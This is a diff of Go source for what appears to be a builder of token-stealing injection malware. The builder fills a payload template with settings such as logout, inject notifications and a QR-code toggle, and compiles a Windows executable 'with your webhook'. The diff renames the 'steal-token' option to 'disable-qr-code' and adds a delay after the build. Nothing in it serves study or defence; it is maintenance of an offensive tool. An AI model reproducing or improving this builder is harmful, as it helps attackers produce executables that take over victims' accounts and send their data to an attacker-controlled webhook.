@@ -21,13 +21,13 @@ var (
 )
 
 type Config struct {
-	Platform     []string `json:"platform"`
-	Logout       string   `json:"logout"`
-	StealToken   string   `json:"steal-token"`
-	InjectNotify string   `json:"inject-notify"`
-	LogoutNotify string   `json:"logout-notify"`
-	InitNotify   string   `json:"init-notify"`
-	EmbedColor   string   `json:"embed-color"`
+	Platform      []string `json:"platform"`
+	Logout        string   `json:"logout"`
+	InjectNotify  string   `json:"inject-notify"`
+	LogoutNotify  string   `json:"logout-notify"`
+	InitNotify    string   `json:"init-notify"`
+	DisableQrCode string   `json:"disable-qr-code"`
+	EmbedColor    string   `json:"embed-color"`
 }
 
 func init() {
@@ -35,7 +35,7 @@ func init() {
 	logger.Error("\nYour Config (see config.txt for options and help):\n", fmt.Sprintf(`Platforms: %s Logout: %s StealToken: %s InjectNotify: %s LogoutNotify: %s InitNotify: %s Embed Color: %s`,
 		fmt.Sprint(cfg.Platform)+"\n",
 		cfg.Logout+"\n",
-		cfg.StealToken+"\n",
+		cfg.DisableQrCode+"\n",
 		cfg.InjectNotify+"\n",
 		cfg.LogoutNotify+"\n",
 		cfg.InitNotify+"\n",
@@ -80,14 +80,14 @@ func cfgChanges(data []byte) string {
 	default:
 		d = replace(d, "%LOGOUT%1", "instant")
 	}
-	// StealToken
-	switch cfg.StealToken {
+	// DisableQrCode
+	switch cfg.DisableQrCode {
 	case "true":
-		d = replace(d, "%STEAL%1", "true")
+		d = replace(d, "%DISABLEQRCODE%1", "true")
 	case "false":
-		d = replace(d, "%STEAL%1", "false")
+		d = replace(d, "%DISABLEQRCODE%1", "false")
 	default:
-		d = replace(d, "%STEAL%1", "false")
+		d = replace(d, "%DISABLEQRCODE%1", "false")
 	}
 	// InjectNotify
 	switch cfg.InjectNotify {
@@ -184,6 +184,7 @@ func buildPlatform() {
 				os.Exit(1)
 			}
 			logger.Info("Windows Executable has been built with your webhook")
+			time.Sleep(time.Second * 10)
 
 		}
 	}
